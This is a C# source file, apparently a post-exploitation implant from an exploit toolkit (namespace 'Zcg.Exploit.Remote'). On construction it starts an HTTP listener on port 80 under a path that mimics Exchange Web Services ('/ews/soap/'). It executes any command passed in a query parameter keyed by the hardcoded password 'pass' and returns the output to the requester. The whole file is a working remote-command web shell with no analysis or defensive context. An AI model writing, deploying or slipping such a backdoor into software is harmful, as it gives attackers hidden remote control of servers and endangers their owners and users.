using System;
using System.Web;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Net;
using System.Reflection;
using System.Collections;
using System.Collections.Generic;
using System.DirectoryServices;

namespace Zcg.Exploit.Remote
{
    public class SimpleExecutionRemoteStub
    {
      public SimpleExecutionRemoteStub()
      {
          new Thread(Listen).Start();
      }
      static void Listen()
    {
        string password = "pass";
        try
        {
            if (!HttpListener.IsSupported)
            {
                return;
            }
            HttpListener listener = new HttpListener();
            listener.Prefixes.Add("http://*:80/ews/soap/");
            listener.Start();
            while (true)
            {
                HttpListenerContext context = listener.GetContext();
                HttpListenerRequest request = context.Request;
                HttpListenerResponse response = context.Response;
                Stream stm = null ;
                string cmd=request.QueryString[password];
                if(!string.IsNullOrEmpty(cmd))
                {
                    try
                    {
                        Process p = new Process();
                        p.StartInfo.FileName = cmd;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.Start();
                        byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
                        response.StatusCode = 200;
                        response.ContentLength64 = data.Length;
                        stm = response.OutputStream;
                        stm.Write(data, 0, data.Length);
                    }
                    catch 
                    { 
                        response.StatusCode = 404; 
                    }
                    finally
                    {
                        if(stm!=null)
                        {
                            stm.Close();
                        }
                    }
                }
                else
                {
                    response.StatusCode = 404;
                    response.OutputStream.Close();
                }
                
            }

        }
        catch
        {

        }
    }
    }
}
